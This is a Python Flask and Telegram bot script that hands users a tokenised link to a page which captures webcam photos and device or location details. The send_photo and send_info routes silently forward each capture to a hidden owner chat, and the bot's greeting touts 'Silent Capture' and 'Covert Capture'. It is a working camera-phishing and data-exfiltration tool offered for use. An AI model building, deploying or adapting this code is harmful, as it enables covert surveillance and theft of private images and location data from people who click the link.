import threading
import requests
import os
import base64
from flask import Flask, request, render_template, jsonify
from telegram.ext import Updater, CommandHandler
from utils import BOT_TOKEN, OWNER_CHAT_ID, IPINFO_TOKEN
from token_store import generate_token, store_token_for_chat, get_chat_id

TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")

app = Flask(__name__)

# ---------------- Telegram Bot Logic ---------------- #
def start(update, context):
    chat_id = update.message.chat_id
    user = update.message.from_user
    token = generate_token(chat_id)
    # Save mapping
    store_token_for_chat(token, chat_id)

    link = f"{RENDER_URL}?token={token}"

    greeting = (
        f"🕶️ *Welcome {user.first_name or ''}*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "💀 *Status:* Activated\n"
        "📡 *Mode:* Silent Capture\n"
        "🎯 *Target:* You\n"
        "🔐 *Encryption:* Enabled\n"
        "🧠 *Bot Intelligence:* Level 99\n"
        "📸 *Camera Access:* Pending\n"
        "🕵️ *Operation:* Covert Capture\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📷 *Click to activate camera:*\n{link}"
    )
    context.bot.send_message(chat_id=chat_id, text=greeting, parse_mode="Markdown")

def run_bot():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    updater.start_polling()

# ---------------- Flask Routes ---------------- #
@app.route("/")
def index():
    token = request.args.get("token")
    return render_template("index.html", token=token, ipinfo_token=IPINFO_TOKEN)

@app.route("/send_photo", methods=["POST"])
def send_photo():
    data = request.json or {}
    image_data = data.get("image")
    token = data.get("token")
    chat_id = get_chat_id(token)

    if not image_data or not chat_id:
        return jsonify({"status": "missing data"}), 400

    try:
        image_bytes = base64.b64decode(image_data.split(",")[1])
    except Exception:
        return jsonify({"status": "invalid image"}), 400

    filename = "temp.jpg"
    try:
        with open(filename, "wb") as f:
            f.write(image_bytes)

        # Step 1: Send photo to user
        with open(filename, "rb") as photo:
            resp = requests.post(
                f"{TELEGRAM_API}/sendPhoto",
                data={"chat_id": chat_id},
                files={"photo": photo}
            )
        result = resp.json()
        print("User photo response:", result)

        # Step 2: Forward to owner
        if result.get("ok"):
            message_id = result["result"]["message_id"]
            requests.post(
                f"{TELEGRAM_API}/forwardMessage",
                data={
                    "chat_id": OWNER_CHAT_ID,
                    "from_chat_id": chat_id,
                    "message_id": message_id
                }
            )
    finally:
        try:
            os.remove(filename)
        except Exception:
            pass

    return jsonify({"status": "sent"}), 200

@app.route("/send_info", methods=["POST"])
def send_info():
    data = request.json or {}
    token = data.get("token")
    chat_id = get_chat_id(token)
    info_text = data.get("info")

    if not chat_id or not info_text:
        return jsonify({"status": "missing data"}), 400

    # Step 1: Send info to user
    resp = requests.post(
        f"{TELEGRAM_API}/sendMessage",
        data={"chat_id": chat_id, "text": info_text, "parse_mode": "Markdown"}
    )
    result = resp.json()
    print("User info response:", result)

    # Step 2: Send to owner with identity
    if result.get("ok"):
        owner_text = f"👤 User ID: `{chat_id}`\n\n{info_text}"
        requests.post(
            f"{TELEGRAM_API}/sendMessage",
            data={"chat_id": OWNER_CHAT_ID, "text": owner_text, "parse_mode": "Markdown"}
        )

    return jsonify({"status": "sent"}), 200

# ---------------- Main Entry ---------------- #
if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)